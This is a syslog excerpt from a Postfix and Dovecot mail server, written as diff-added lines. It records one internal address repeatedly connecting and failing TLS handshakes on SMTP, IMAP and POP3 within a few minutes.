+Nov  6 11:07:41 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:41 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:41 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:41 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:41 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:07:42 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:42 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:42 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:42 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:42 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:42 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:07:43 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:43 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:43 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:43 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:43 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:43 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:07:44 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:44 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:44 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:44 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:44 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:44 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:07:45 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:45 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:45 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:45 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:45 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:45 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:45 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:07:46 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:46 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:46 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:46 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:46 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:46 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:07:47 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:47 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:47 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:47 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:47 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:47 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:07:48 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:48 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:48 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:48 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:48 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:48 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:07:49 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:49 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:49 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:49 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:49 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:49 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:07:50 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:07:50 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:07:50 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:07:50 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:07:50 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:07:51 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:04 ubuntuA3 last message repeated 25 times
+Nov  6 11:08:04 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:04 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:05 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:08:05 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:05 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:05 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:05 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:05 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:06 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:08:06 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:06 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:06 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:06 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:06 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:07 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:07 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:07 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:07 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:07 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:07 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:08 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:08 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:08 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:08 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:08 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:08 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:09 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:09 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:09 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:09 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:09 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:09 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:10 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:10 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:10 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:10 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:10 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:10 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:11 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:11 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:11 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:11 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:11 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:11 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:12 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:12 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:12 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:12 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:12 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:12 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:13 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:13 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:13 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:13 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:13 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:13 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:14 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:14 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:14 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:14 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:14 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:14 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:15 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:15 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:15 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:15 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:15 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:15 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:16 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:16 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:16 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:16 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:16 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:16 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:17 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:17 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:17 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:17 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:17 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:17 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:17 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:17 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:17 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:17 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:17 ubuntuA3 postfix/smtpd[5657]: warning: TLS library problem: 5657:error:05066066:Diffie-Hellman routines:COMPUTE_KEY:invalid public key:dh_key.c:214:
+Nov  6 11:08:17 ubuntuA3 postfix/smtpd[5657]: warning: TLS library problem: 5657:error:1408B005:SSL routines:SSL3_GET_CLIENT_KEY_EXCHANGE:DH lib:s3_srvr.c:1874:
+Nov  6 11:08:17 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:17 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:17 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:17 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:18 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:18 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:18 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:18 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:18 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:18 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:18 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:18 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:18 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:18 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:18 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:18 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:18 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:18 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:18 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:19 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:19 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:19 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:19 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:19 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:19 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:20 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:20 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:20 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:20 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:20 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:20 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:21 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:21 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:21 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:21 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:21 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:21 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:22 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:22 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:22 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:22 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:22 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:23 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:23 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:23 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:23 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:23 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:23 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:24 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:24 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:24 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:24 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:24 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:25 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:25 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:25 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:25 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:25 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:26 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:26 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:26 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:26 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:26 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:27 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:27 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:27 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:27 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:27 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:27 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:27 ubuntuA3 postfix/smtpd[5776]: warning: TLS library problem: 5776:error:1408A0C1:SSL routines:SSL3_GET_CLIENT_HELLO:no shared cipher:s3_srvr.c:1006:
+Nov  6 11:08:27 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:27 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:27 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:28 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:28 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:28 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:28 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:28 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:28 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:29 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:29 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:29 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:29 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:29 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:30 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:30 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:30 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:30 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:30 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:31 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:31 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:31 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:31 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:31 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:32 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:32 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:32 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:32 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:32 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:08:33 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:08:33 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:08:33 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:08:33 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:08:33 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:08:33 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:08:34 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
